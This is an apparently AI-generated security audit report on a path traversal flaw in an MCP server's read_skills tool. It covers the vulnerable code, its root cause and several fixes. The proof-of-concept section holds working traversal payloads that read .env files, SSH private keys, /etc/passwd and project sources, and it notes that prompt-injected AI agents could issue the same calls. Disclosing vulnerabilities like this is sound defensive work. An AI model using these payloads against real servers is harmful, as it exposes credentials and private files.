# OMCP-002: Path Traversal in read_skills Allows Arbitrary File Read

## Overview
| Field | Value |
|-------|-------|
| ID | OMCP-002 |
| Title | Path Traversal in read_skills Allows Arbitrary File Read |
| Severity | High |
| CVSS Score | 7.5 |
| Auth Required | No |
| Local/Remote | Remote |
| Status | Confirmed |
| Category | Product Code Finding |

## SVS Mapping
- **TASVS**: N/A
- **ASVS**: ASVS-5.1.3 - Input validation
- **ASVS**: ASVS-12.3.1 - File path traversal prevention

## CWE Reference
- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## Vulnerability Details

### Description

The `read_skills` MCP tool accepts a list of skill names from MCP clients and passes them to `_read_skill()` which constructs file paths without any sanitization against directory traversal sequences (`..`). An attacker (or a prompt-injected AI agent) can read arbitrary text files on the server's filesystem by crafting skill names containing `..` path components.

The vulnerability exists in two components of the name:
1. The first path component (`parts[0]`) can be `..`, which passes the `is_dir()` check since the parent directory always exists.
2. Subsequent path components (joined into `ref_path`) can contain arbitrary `..` segments.

The only limitation is a `.md` suffix fallback: files without an extension get `.md` appended. However, any file with any extension (`.py`, `.toml`, `.json`, `.env`, `.key`, `.pem`, `.cfg`, `.ini`, `.txt`, etc.) can be read directly.

### Affected Code

**File:** [/sources/openstaad-mcp/src/openstaad_mcp/skills.py:77-99](/sources/openstaad-mcp/src/openstaad_mcp/skills.py#L77-L99)
```python
def _read_skill(name: str, skills_root: Path) -> str:
    """Read a single skill or skill reference and return its content."""
    parts = name.split("/")
    skill_dir = skills_root / parts[0]  # No traversal check on parts[0]

    if not skill_dir.is_dir():
        available = [d.name for d in sorted(skills_root.iterdir()) if d.is_dir() and (d / "SKILL.md").is_file()]
        return (
            f"Error: Skill '{parts[0]}' not found.\nAvailable skills: ..."
        )

    if len(parts) == 1:
        skill_file = skill_dir / "SKILL.md"
        ...

    ref_path = Path("/".join(parts[1:]))  # No traversal check on remaining parts
    if not ref_path.suffix:
        ref_path = ref_path.with_suffix(".md")
    ref_file = skill_dir / ref_path  # Path traversal here
    if ref_file.is_file():
        return f"# Skill: {parts[0]}/{ref_path}\n\n{ref_file.read_text(encoding='utf-8')}"
```

**Caller chain (no sanitization at any level):**
- [/sources/openstaad-mcp/src/openstaad_mcp/server.py:75-85](/sources/openstaad-mcp/src/openstaad_mcp/server.py#L75-L85) -- `read_skills` MCP tool definition
- [/sources/openstaad-mcp/src/openstaad_mcp/skills.py:108-115](/sources/openstaad-mcp/src/openstaad_mcp/skills.py#L108-L115) -- `read_skills_impl` passes names directly to `_read_skill`

No input validation is performed at the MCP tool entry point.

### Root Cause Analysis
- **Vulnerable code explanation**: The `_read_skill` function directly uses user-controlled `name` to construct filesystem paths via `Path` joining. No path canonicalization (`resolve()`) or containment check (`is_relative_to()`) is performed. Path components from user input are joined with `skills_root` using `/` operator without any validation for `..` segments, symbolic links, or path escapes.
- **Attack prerequisites**: Ability to invoke the `read_skills` MCP tool. In stdio mode, the MCP client (AI agent) calls this. In HTTP mode, any client with network access (and a valid token, if configured) can invoke it. Via prompt injection, a remote attacker can influence the AI agent to call `read_skills` with a crafted path.
- **Impact assessment**: Arbitrary file read of any UTF-8-decodable file readable by the server process. This includes Python source files, configuration files, `.env` files, `pyproject.toml`, SSH keys, and system files (e.g., `/etc/passwd` on Linux, `C:\Windows\win.ini` on Windows).

## Proof of Concept

**Via MCP Protocol (JSON-RPC):**
```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "read_skills",
    "arguments": {
      "skills": ["staad-core/../../pyproject.toml"]
    }
  },
  "id": 1
}
```

**Path resolution walkthrough:**
1. `name = "staad-core/../../pyproject.toml"`
2. `parts = ["staad-core", "..", "..", "pyproject.toml"]`
3. `skill_dir = skills_root / "staad-core"` -- valid directory, passes `is_dir()` check
4. `ref_path = Path("../../pyproject.toml")` -- has `.toml` suffix, no `.md` appended
5. `ref_file = skill_dir / "../../pyproject.toml"` -- resolves to `<package_root>/pyproject.toml`
6. `ref_file.is_file()` -> True
7. Returns `ref_file.read_text(encoding='utf-8')` -- full file contents

**Additional traversal vectors:**
```python
# Read server source code
read_skills(["staad-core/../../src/openstaad_mcp/server.py"])

# Traversal via parts[0] = ".." (also works)
read_skills(["../../../etc/passwd"])
# parts[0] = ".." -> skills_root/.. = package root (is_dir = True)

# Read .env if present
read_skills(["staad-core/../../.env"])

# Read Windows hosts file
read_skills(["staad-core/" + "../" * 20 + "windows/system32/drivers/etc/hosts.txt"])

# Excess ".." segments beyond filesystem root are silently ignored by the OS
read_skills(["staad-core/" + "../" * 20 + "Users/username/.ssh/id_rsa.pem"])
```

**PoC Script:** [/sources/openstaad-mcp/../results/reports_1/poc/OMCP-002-path-traversal.py](/sources/openstaad-mcp/../results/reports_1/poc/OMCP-002-path-traversal.py)

## Fix Recommendations

1. **Canonicalize and confine paths**: After constructing `ref_file`, resolve it and verify it remains within `skills_root`:
```python
ref_file = (skill_dir / ref_path).resolve()
if not ref_file.is_relative_to(skills_root.resolve()):
    return "Error: Invalid path."
```

2. **Validate skill_dir stays within skills_root**:
```python
try:
    skill_dir.resolve().relative_to(skills_root.resolve())
except ValueError:
    return f"Error: Invalid skill name '{parts[0]}'."
```

3. **Reject path traversal components**: Validate that no path component is `..`:
```python
if any(p == ".." for p in parts):
    return "Error: Invalid skill name."
```

4. **Validate `parts[0]`**: Ensure it matches expected skill directory names (alphanumeric + hyphens only):
```python
import re
if not re.match(r'^[a-zA-Z0-9_-]+$', parts[0]):
    return "Error: Invalid skill name."
```

## Semgrep Rule Suggestion (if applicable)

- **Pattern type**: Taint source (MCP tool parameter) -> sink (Path.read_text after Path joining without resolve/is_relative_to check)
- **Why automatable**: Classic path traversal pattern -- user input concatenated into file path without canonicalization
- **Suggested rule name**: python.security.path-traversal-pathlib-join

---

## Source Reports
- [/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_1/OMCP-002-path-traversal-read-skills.md](/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_1/OMCP-002-path-traversal-read-skills.md)
- [/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_2/OMCP-001-path-traversal-read-skills.md](/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_2/OMCP-001-path-traversal-read-skills.md)
- First discovered: Apr-14-2026-0000
- Validated: Apr-14-2026

## Report Metadata
| Field | Value |
|-------|-------|
| Agent | GitHub Copilot |
| Model | Claude Opus 4.6 |
| Timestamp | Apr-14-2026-0000 |
